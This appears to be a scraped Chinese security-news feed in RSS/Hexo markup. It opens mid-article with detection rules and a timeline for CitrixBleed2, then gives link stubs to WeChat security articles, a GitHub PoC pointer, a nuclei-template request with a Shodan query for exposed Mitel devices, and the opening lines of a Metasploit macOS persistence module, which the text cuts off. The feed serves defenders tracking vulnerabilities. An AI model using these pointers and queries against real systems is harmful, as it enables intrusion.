yaml"><span class="hljs-attr">title:</span> <span class="hljs-string">Netscaler</span> <span class="hljs-string">CitrixBleed2</span> <span class="hljs-string">Large</span> <span class="hljs-string">Host</span> <span class="hljs-string">Header</span><br><span class="hljs-attr">id:</span> <span class="hljs-string">4d6f1e1b-0bfe-4473-a732-3e7e9a21f650</span><br><span class="hljs-attr">status:</span> <span class="hljs-string">experimental</span><br><span class="hljs-attr">description:</span> <span class="hljs-string">Detects</span> <span class="hljs-string">abnormal</span> <span class="hljs-string">Host</span> <span class="hljs-string">header</span> <span class="hljs-string">length</span> <span class="hljs-string">in</span> <span class="hljs-string">requests</span> <span class="hljs-string">to</span> <span class="hljs-string">/nf/auth/startwebview.do</span><br><span class="hljs-attr">references:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">https://nvd.nist.gov/vuln/detail/CVE-2025-5777</span><br><span class="hljs-attr">author:</span> <span class="hljs-string">mingshenhk</span><br><span class="hljs-attr">logsource:</span><br>  <span class="hljs-attr">product:</span> <span class="hljs-string">netscaler</span><br>  <span class="hljs-attr">service:</span> <span class="hljs-string">http_access</span><br><span class="hljs-attr">detection:</span><br>  <span class="hljs-attr">selection:</span><br>    <span class="hljs-attr">cs-uri-stem:</span> <span class="hljs-string">&quot;/nf/auth/startwebview.do&quot;</span><br>    <span class="hljs-string">c-host|strlen|gt:</span> <span class="hljs-number">4096</span><br>  <span class="hljs-attr">condition:</span> <span class="hljs-string">selection</span><br><span class="hljs-attr">level:</span> <span class="hljs-string">critical</span><br></code></pre></td></tr></table></figure></details><details><summary>🛡️ Suricata 规则</summary><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs suricata">alert http any any -&gt; any any (<br>  msg:&quot;CitrixBleed2 CVE-2025-5777 Host header overflow&quot;;<br>  http.uri; content:&quot;/nf/auth/startwebview.do&quot;; nocase;<br>  http.header; field:Host; content:&quot;AAAAAAAA&quot;; within:0; distance:0; offset:4096;<br>  classtype:attempted-recon;<br>  sid:5777002; rev:1;<br>)<br></code></pre></td></tr></table></figure></details><details><summary>🔒 Nginx-Lua Inline Hotpatch</summary><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-comment">-- access_by_lua_block</span><br><span class="hljs-keyword">local</span> host = ngx.var.http_host <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">if</span> #host &gt; <span class="hljs-number">4096</span> <span class="hljs-keyword">then</span><br>  ngx.<span class="hljs-built_in">log</span>(ngx.WARN,<span class="hljs-string">&quot;[CitrixBleed2] Blocked Host len=&quot;</span>,#host)<br>  <span class="hljs-keyword">return</span> ngx.<span class="hljs-built_in">exit</span>(ngx.HTTP_REQUEST_HEADER_FIELDS_TOO_LARGE)<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure></details><hr><h3 id="附录-B-—-时间轴"><a href="#附录-B-—-时间轴" class="headerlink" title="附录 B — 时间轴"></a>附录 B — 时间轴</h3><table><thead><tr><th>日期 (2025)</th><th>事件</th></tr></thead><tbody><tr><td>06-17</td><td>Citrix 初次发布 CVE-2025-5777 公告 (<a href="https://www.netscaler.com/blog/news/critical-security-updates-for-netscaler-netscaler-gateway-and-netscaler-console/?utm_source=chatgpt.com" title="Critical security updates for NetScaler, NetScaler Gateway, and ...">netscaler.com</a>)</td></tr><tr><td>06-18</td><td>Bishop Fox 首发技术拆解 &amp; PoC (<a href="https://bishopfox.com/blog/netscaler-adc-and-gateway-advisory?utm_source=chatgpt.com" title="OOB Memory Read: Netscaler ADC and Gateway - Bishop Fox">bishopfox.com</a>)</td></tr><tr><td>06-23</td><td>Citrix 更新影响范围 + 补丁版本；CISA 将其列入 KEV</td></tr><tr><td>06-25</td><td>ReliaQuest 报告活跃利用，威胁组正批量窃取会话 (<a href="https://reliaquest.com/blog/threat-spotlight-citrix-bleed-2-vulnerability-in-netscaler-adc-gateway-devices/?utm_source=chatgpt.com" title="Threat Spotlight: CVE-2025-5777: Citrix Bleed 2 Opens Old Wounds">reliaquest.com</a>)</td></tr><tr><td>06-27</td><td>BleepingComputer 报道“可能已大规模被利用” (<a href="https://www.bleepingcomputer.com/news/security/citrix-bleed-2-flaw-now-believed-to-be-exploited-in-attacks/?utm_source=chatgpt.com" title="Citrix Bleed 2 flaw now believed to be exploited in attacks">bleepingcomputer.com</a>)</td></tr><tr><td>06-28</td><td>多个 GitHub PoC 出现；Tenable 发布 FAQ (<a href="https://www.tenable.com/blog/cve-2025-5777-cve-2025-6543-frequently-asked-questions-about-citrixbleed-2?utm_source=chatgpt.com" title="CVE-2025-5777, CVE-2025-6543: Frequently Asked Questions ...">tenable.com</a>)</td></tr></tbody></table><hr><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ol><li>Citrix 官方安全通告与补丁说明 (<a href="https://www.netscaler.com/blog/news/critical-security-updates-for-netscaler-netscaler-gateway-and-netscaler-console/?utm_source=chatgpt.com" title="Critical security updates for NetScaler, NetScaler Gateway, and ...">netscaler.com</a>)</li><li>Arctic Wolf《CVE-2025-5777 技术简报》 (<a href="https://arcticwolf.com/resources/blog/cve-2025-5777/?utm_source=chatgpt.com" title="CVE-2025-5777 | Arctic Wolf">arcticwolf.com</a>)</li><li>Bishop Fox《OOB Memory Read in NetScaler》 (<a href="https://bishopfox.com/blog/netscaler-adc-and-gateway-advisory?utm_source=chatgpt.com" title="OOB Memory Read: Netscaler ADC and Gateway - Bishop Fox">bishopfox.com</a>)</li><li>ReliaQuest《Threat Spotlight: CitrixBleed 2》 (<a href="https://reliaquest.com/blog/threat-spotlight-citrix-bleed-2-vulnerability-in-netscaler-adc-gateway-devices/?utm_source=chatgpt.com" title="Threat Spotlight: CVE-2025-5777: Citrix Bleed 2 Opens Old Wounds">reliaquest.com</a>)</li><li>Tenable FAQ on CVE-2025-5777 (<a href="https://www.tenable.com/blog/cve-2025-5777-cve-2025-6543-frequently-asked-questions-about-citrixbleed-2?utm_source=chatgpt.com" title="CVE-2025-5777, CVE-2025-6543: Frequently Asked Questions ...">tenable.com</a>)</li><li>BleepingComputer 安全快讯 (<a href="https://www.bleepingcomputer.com/news/security/citrix-bleed-2-flaw-now-believed-to-be-exploited-in-attacks/?utm_source=chatgpt.com" title="Citrix Bleed 2 flaw now believed to be exploited in attacks">bleepingcomputer.com</a>)</li><li>NVD CVE-2025-5777 条目 (<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5777?utm_source=chatgpt.com" title="CVE-2025-5777 Detail - NVD">nvd.nist.gov</a>)</li><li>Citrix Support KB CTX693420 (<a href="https://support.citrix.com/support-home/kbsearch/article?articleNumber=CTX693420&utm_source=chatgpt.com" title="CVE-2025-5777 - CITRIX | Support">support.citrix.com</a>)</li></ol><blockquote><p><strong>完</strong> — 希望本文档能帮助你全方位理解并应对 CitrixBleed 2。如果需要进一步补充示例、脚本或演练指导，欢迎继续提出！</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Citrix NetScaler ADC&amp;#x2F;Gateway 越界内存读</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
    
  </entry>
  
  <entry>
    <title>Github Poc</title>
    <link href="http://example.com/2025/06/30/github_2926243623/"/>
    <id>http://example.com/2025/06/30/github_2926243623/</id>
    <published>2025-06-30T11:15:11.758Z</published>
    <updated>2025-06-30T11:15:11.753Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> </p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-27388</li></ul><p><strong>来源：</strong> <a href="https://github.com/Mahesh-970/CVE-2024-27388_afterPatch_validation">https://github.com/Mahesh-970/CVE-2024-27388_afterPatch_validation</a></p><p><strong>类型：</strong> CVE-2024:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>.whitesource</li><li>gss_rpc_xdr.c</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="CVE-2024:github search" scheme="http://example.com/tags/CVE-2024-github-search/"/>
    
  </entry>
  
  <entry>
    <title>Windows IIS与Linux服务器同时遭定制恶意软件攻击</title>
    <link href="http://example.com/2025/06/30/weixin_2318673157/"/>
    <id>http://example.com/2025/06/30/weixin_2318673157/</id>
    <published>2025-06-30T11:07:30.090Z</published>
    <updated>2025-06-30T11:07:30.086Z</updated>
    
    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/YAU5pHFtebeuEcdsUQmuDg">https://mp.weixin.qq.com/s/YAU5pHFtebeuEcdsUQmuDg</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/YAU5pHFtebeuEcdsUQmuDg&quot;&gt;https://mp.weixin.q</summary>
      
    
    
    
    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
    
    
    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
    
    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
    
  </entry>
  
  <entry>
    <title>群晖ABM漏洞泄露全局客户端密钥，危及所有微软365租户</title>
    <link href="http://example.com/2025/06/30/weixin_1241502972/"/>
    <id>http://example.com/2025/06/30/weixin_1241502972/</id>
    <published>2025-06-30T11:07:29.756Z</published>
    <updated>2025-06-30T11:07:29.754Z</updated>
    
    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/-LLztedIca8uz1i7gvxpYA">https://mp.weixin.qq.com/s/-LLztedIca8uz1i7gvxpYA</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/-LLztedIca8uz1i7gvxpYA&quot;&gt;https://mp.weixin.q</summary>
      
    
    
    
    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
    
    
    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
    
    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
    
  </entry>
  
  <entry>
    <title>上海“工赋砺网”芯片安全培训会成功举行，斗象科技“芯企安全方案”广获好评</title>
    <link href="http://example.com/2025/06/30/weixin_255000686/"/>
    <id>http://example.com/2025/06/30/weixin_255000686/</id>
    <published>2025-06-30T11:07:29.418Z</published>
    <updated>2025-06-30T11:07:29.414Z</updated>
    
    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/xwCUqSfnAG4MDKT8dPl5eg">https://mp.weixin.qq.com/s/xwCUqSfnAG4MDKT8dPl5eg</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/xwCUqSfnAG4MDKT8dPl5eg&quot;&gt;https://mp.weixin.q</summary>
      
    
    
    
    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
    
    
    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
    
    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
    
  </entry>
  
  <entry>
    <title>一键挖洞+自动出报告的自动化工具，免费试用资格，限时抢！</title>
    <link href="http://example.com/2025/06/30/weixin_4162487137/"/>
    <id>http://example.com/2025/06/30/weixin_4162487137/</id>
    <published>2025-06-30T11:07:28.564Z</published>
    <updated>2025-06-30T11:07:28.562Z</updated>
    
    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/AP-r6WcZXg22vKywWsN3wQ">https://mp.weixin.qq.com/s/AP-r6WcZXg22vKywWsN3wQ</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/AP-r6WcZXg22vKywWsN3wQ&quot;&gt;https://mp.weixin.q</summary>
      
    
    
    
    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
    
    
    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
    
    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
    
  </entry>
  
  <entry>
    <title>安全热点周报：iOS 零点击攻击用于传播 Graphite 间谍软件</title>
    <link href="http://example.com/2025/06/30/weixin_3601389870/"/>
    <id>http://example.com/2025/06/30/weixin_3601389870/</id>
    <published>2025-06-30T10:52:23.716Z</published>
    <updated>2025-06-30T10:52:23.715Z</updated>
    
    <content type="html"><![CDATA[<p><strong>公众号：</strong> 奇安信 CERT</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/1kJCTOCPhZ_fv16aYA0Ccg">https://mp.weixin.qq.com/s/1kJCTOCPhZ_fv16aYA0Ccg</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 奇安信 CERT&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/1kJCTOCPhZ_fv16aYA0Ccg&quot;&gt;https://mp.weixin.</summary>
      
    
    
    
    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
    
    
    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
    
    <category term="奇安信 CERT" scheme="http://example.com/tags/%E5%A5%87%E5%AE%89%E4%BF%A1-CERT/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2025-5777 Session Hijack</title>
    <link href="http://example.com/2025/06/30/github_1200336265/"/>
    <id>http://example.com/2025/06/30/github_1200336265/</id>
    <published>2025-06-30T10:45:11.784Z</published>
    <updated>2025-06-30T10:45:11.783Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> CVE-2025-5777 Session Hijack</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-5777</li></ul><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞描述：</strong> 该漏洞涉及会话劫持，可能导致未授权访问。</p><p><strong>来源：</strong> <a href="https://github.com/nagenar/CVE-2025-5777-Session-Hijack">https://github.com/nagenar/CVE-2025-5777-Session-Hijack</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-5777-Session-Hijack"><a href="#CVE-2025-5777-Session-Hijack" class="headerlink" title="CVE-2025-5777-Session-Hijack"></a>CVE-2025-5777-Session-Hijack</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; CVE-2025-5777 Session Hijack&lt;/p&gt;
&lt;p&gt;&lt;st</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
    
    <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    
  </entry>
  
  <entry>
    <title>特朗普同学：摊牌了，不装了，就网络攻击中国了！！！</title>
    <link href="http://example.com/2025/06/30/weixin_1748796237/"/>
    <id>http://example.com/2025/06/30/weixin_1748796237/</id>
    <published>2025-06-30T10:44:45.654Z</published>
    <updated>2025-06-30T10:44:45.650Z</updated>
    
    <content type="html"><![CDATA[<p><strong>公众号：</strong> OSINT情报分析师</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/Xx6FZSgkgNyJZFK9KEoOSg">https://mp.weixin.qq.com/s/Xx6FZSgkgNyJZFK9KEoOSg</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; OSINT情报分析师&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/Xx6FZSgkgNyJZFK9KEoOSg&quot;&gt;https://mp.weixi</summary>
      
    
    
    
    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
    
    
    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
    
    <category term="OSINT情报分析师" scheme="http://example.com/tags/OSINT%E6%83%85%E6%8A%A5%E5%88%86%E6%9E%90%E5%B8%88/"/>
    
  </entry>
  
  <entry>
    <title>特朗普暗示美国正在对东大进行黑客攻击</title>
    <link href="http://example.com/2025/06/30/weixin_474097153/"/>
    <id>http://example.com/2025/06/30/weixin_474097153/</id>
    <published>2025-06-30T09:48:39.612Z</published>
    <updated>2025-06-30T09:48:39.611Z</updated>
    
    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/ee1vDVb5NKNJnEM7COtRzg">https://mp.weixin.qq.com/s/ee1vDVb5NKNJnEM7COtRzg</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/ee1vDVb5NKNJnEM7COtRzg&quot;&gt;https://mp.weixin.qq.c</summary>
      
    
    
    
    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
    
    
    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
    
    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Mitel MiCollab and MiVoice Business Express TP-240 信息泄露和拒绝服务漏洞</title>
    <link href="http://example.com/2025/06/30/github_823656353/"/>
    <id>http://example.com/2025/06/30/github_823656353/</id>
    <published>2025-06-30T09:30:21.533Z</published>
    <updated>2025-06-30T09:30:21.530Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Mitel MiCollab and MiVoice Business Express TP-240 信息泄露和拒绝服务漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2022-26143</li></ul><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Mitel MiCollab 9.4 SP1 FP1之前版本和MiVoice Business Express 8.1及之前版本中的TP-240 (aka tp240dvr)组件存在漏洞，远程攻击者可利用该漏洞获取敏感信息并导致拒绝服务（性能下降和过多的出站流量）。2022年2月和3月，该漏洞被利用于TP240PhoneHome DDoS攻击。</p><p><strong>产品厂商：</strong> Mitel</p><p><strong>产品名称：</strong> MiCollab, MiVoice Business Express</p><p><strong>影响版本：</strong> MiCollab before 9.4 SP1 FP1, MiVoice Business Express through 8.1</p><p><strong>搜索语法：</strong> http.favicon.hash:”-1922044295”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12494">https://github.com/projectdiscovery/nuclei-templates/issues/12494</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>The TP-240 (aka tp240dvr) component in Mitel MiCollab before 9.4 SP1 FP1 and MiVoice Business Express through 8.1 allows remote attackers to obtain sensitive information and cause a denial of service (performance degradation and excessive outbound traffic). This was exploited in the wild in February and March 2022 for the TP240PhoneHome DDoS attack.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://arstechnica.com/information-technology/2022/03/ddosers-use-new-method-capable-of-amplifying-traffic-by-a-factor-of-4-billion/">https://arstechnica.com/information-technology/2022/03/ddosers-use-new-method-capable-of-amplifying-traffic-by-a-factor-of-4-billion/</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-http-favicon-hash-1922044295"><a href="#Shodan-Query-http-favicon-hash-1922044295" class="headerlink" title="Shodan Query: http.favicon.hash:&quot;-1922044295&quot;"></a>Shodan Query: <code>http.favicon.hash:&quot;-1922044295&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Mitel MiCollab and MiVoice Business Exp</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>OSX Periodic Script Persistence</title>
    <link href="http://example.com/2025/06/30/github_2100760300/"/>
    <id>http://example.com/2025/06/30/github_2100760300/</id>
    <published>2025-06-30T09:15:28.371Z</published>
    <updated>2025-06-30T09:15:28.365Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> OSX Periodic Script Persistence</p><p><strong>漏洞类型：</strong> 权限提升</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 该模块通过在&#x2F;etc&#x2F;periodic目录中写入脚本实现持久化。根据The Art of Mac Malware，截至2024年，尚未有恶意软件以此方式实现持久化。此载荷需要root权限才能运行。</p><p><strong>产品厂商：</strong> Apple</p><p><strong>产品名称：</strong> Mac OS X</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/a5e30153e827206ce468dd434590aa8ae063d891/modules%2Fexploits%2Fosx%2Flocal%2Fperiodic_script_persistence.rb">https://github.com/rapid7/metasploit-framework/blob/a5e30153e827206ce468dd434590aa8ae063d891/modules%2Fexploits%2Fosx%2Flocal%2Fperiodic_script_persistence.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; <span class="hljs-title class_ 